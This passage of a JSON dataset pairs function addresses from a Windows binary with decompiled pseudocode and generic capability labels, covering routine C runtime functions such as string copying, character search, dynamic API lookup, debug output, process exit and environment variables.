        "decompiled_code": "\nuint __cdecl fcn.0045acc6(char *arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint *puVar2;\n    char *pcVar3;\n    uint uStack16;\n    \n    if ((arg_8h != NULL) && (arg_ch != 0)) {\n        if (arg_10h != 0) {\n            pcVar3 = arg_8h;\n            do {\n                cVar1 = pcVar3[arg_10h - arg_8h];\n                *pcVar3 = cVar1;\n                pcVar3 = pcVar3 + 1;\n                if (cVar1 == '\\0') {\n                    return 0;\n                }\n                arg_ch = arg_ch + -1;\n            } while (arg_ch != 0);\n            *arg_8h = '\\0';\n            puVar2 = fcn.0043bcb5();\n            uStack16 = 0x22;\n            goto code_r0x0045acec;\n        }\n        *arg_8h = '\\0';\n    }\n    puVar2 = fcn.0043bcb5();\n    uStack16 = 0x16;\ncode_r0x0045acec:\n    *puVar2 = uStack16;\n    fcn.0043bb3e();\n    return uStack16;\n}\n",
        "token_count": 301
    },
    "00463c4b": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint16_t * fcn.00463c4b(uint16_t *param_1, uint16_t param_2)\n\n{\n    uchar auVar1 [16];\n    uchar auVar2 [16];\n    uint16_t uVar3;\n    uint16_t uVar4;\n    int32_t iVar5;\n    \n    if (0 < *0x6ccba8) {\n        auVar1 = pshuflw(ZEXT216(param_2), ZEXT216(param_2), 0);\n        do {\n            if ((param_1 & 0xfff) < 0xff1) {\n                uVar3 = SUB162(auVar1, 0);\n                uVar4 = SUB162(auVar1 >> 0x10, 0);\n                auVar2 = CONCAT214(-(*0x47d04e == param_1[7]), \n                                   CONCAT212(-(*0x47d04c == param_1[6]), \n                                             CONCAT210(-(*0x47d04a == param_1[5]), \n                                                       CONCAT28(-(*0x47d048 == param_1[4]), \n                                                                CONCAT26(-(*0x47d046 == param_1[3]), \n                                                                         CONCAT24(-(*0x47d044 == param_1[2]), \n                                                                                  CONCAT22(-(*0x47d042 == param_1[1]), \n                                                                                           -(*0x47d040 == *param_1))))))\n                                            )) |\n                         CONCAT214(-(param_1[7] == uVar4), \n                                   CONCAT212(-(param_1[6] == uVar3), \n                                             CONCAT210(-(param_1[5] == uVar4), \n                                                       CONCAT28(-(param_1[4] == uVar3), \n                                                                CONCAT26(-(param_1[3] == uVar4), \n                                                                         CONCAT24(-(param_1[2] == uVar3), \n                                                                                  CONCAT22(-(param_1[1] == uVar4), \n                                                                                           -(*param_1 == uVar3))))))));\n                uVar3 = SUB161(auVar2 >> 7, 0) & 1 | (SUB161(auVar2 >> 0xf, 0) & 1) << 1 |\n                        (SUB161(auVar2 >> 0x17, 0) & 1) << 2 | (SUB161(auVar2 >> 0x1f, 0) & 1) << 3 |\n                        (SUB161(auVar2 >> 0x27, 0) & 1) << 4 | (SUB161(auVar2 >> 0x2f, 0) & 1) << 5 |\n                        (SUB161(auVar2 >> 0x37, 0) & 1) << 6 | (SUB161(auVar2 >> 0x3f, 0) & 1) << 7 |\n                        (SUB161(auVar2 >> 0x47, 0) & 1) << 8 | (SUB161(auVar2 >> 0x4f, 0) & 1) << 9 |\n                        (SUB161(auVar2 >> 0x57, 0) & 1) << 10 | (SUB161(auVar2 >> 0x5f, 0) & 1) << 0xb |\n                        (SUB161(auVar2 >> 0x67, 0) & 1) << 0xc | (SUB161(auVar2 >> 0x6f, 0) & 1) << 0xd |\n                        (SUB161(auVar2 >> 0x77, 0) & 1) << 0xe | SUB161(auVar2 >> 0x7f, 0) << 0xf;\n                if (uVar3 != 0) goto code_r0x0047a2c7;\n                iVar5 = 0x10;\n            }\n            else {\n                if (*param_1 == param_2) {\n                    return param_1;\n                }\n                if (*param_1 == 0) {\n                    return NULL;\n                }\n                iVar5 = 2;\n            }\n            param_1 = param_1 + iVar5;\n        } while( true );\n    }\n    uVar3 = *param_1;\n    while ((uVar3 != 0 && (uVar3 != param_2))) {\n        param_1 = param_1 + 1;\n        uVar3 = *param_1;\n    }\ncode_r0x0047a266:\n    return (uVar3 != param_2) - 1 & param_1;\ncode_r0x0047a2c7:\n    iVar5 = 0;\n    if (uVar3 != 0) {\n        for (; (uVar3 >> iVar5 & 1) == 0; iVar5 = iVar5 + 1) {\n        }\n    }\n    param_1 = param_1 + iVar5;\n    uVar3 = *param_1;\n    goto code_r0x0047a266;\n}\n",
        "token_count": 1117
    },
    "00476204": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint32_t fcn.00476204(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    \n    uVar4 = *0x6cdb00;\n    if (*0x6cdb00 != 1) {\n        if (*0x6cdb00 != 0) {\n            return *0x6cdb00 & 0xffffff00 | 1;\n        }\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(L\"KERNEL32.DLL\");\n        if (((uVar2 == 0) ||\n            (iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"AcquireSRWLockExclusive\"),  iVar3 == 0)) ||\n           (*0x6cdb04 = iVar3,  iVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2, \"ReleaseSRWLockExclusive\"), \n           iVar3 == 0)) {\n            uVar2 = 1;\n            iVar3 = *0x6cdb08;\n        }\n        *0x6cdb08 = iVar3;\n        uVar4 = 0;\n        LOCK();\n        uVar1 = uVar2;\n        if (*0x6cdb00 != 0) {\n            uVar4 = *0x6cdb00;\n            uVar1 = *0x6cdb00;\n        }\n        *0x6cdb00 = uVar1;\n        if ((uVar4 != 0) || (uVar2 != 1)) {\n            return uVar4 & 0xffffff00 | uVar4 != 1;\n        }\n    }\n    return uVar4 & 0xffffff00;\n}\n",
        "token_count": 377
    },
    "00464ce4": {
        "rules": [
            "print debug messages"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00464ce4(uint *arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(*arg_8h);\n    return;\n}\n",
        "token_count": 42
    },
    "00456bbf": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00456bbf(uint uExitCode)\n\n{\n    code *pcVar1;\n    char cVar2;\n    uint uVar3;\n    \n    cVar2 = fcn.00456c3b();\n    if (cVar2 != '\\0') {\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(uExitCode);\n        (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar3);\n    }\n    fcn.00456c54(uExitCode);\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(uExitCode);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 152
    },
    "00463ae3": {
        "rules": [
            "set environment variable"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463ae3(uint *arg_8h, uint *arg_ch)\n\n{\n    (*_sym.imp.KERNEL32.dll_SetEnvironmentVariableW)(*arg_8h, *arg_ch);\n    return;\n}\n",
        "token_count": 51
    }
}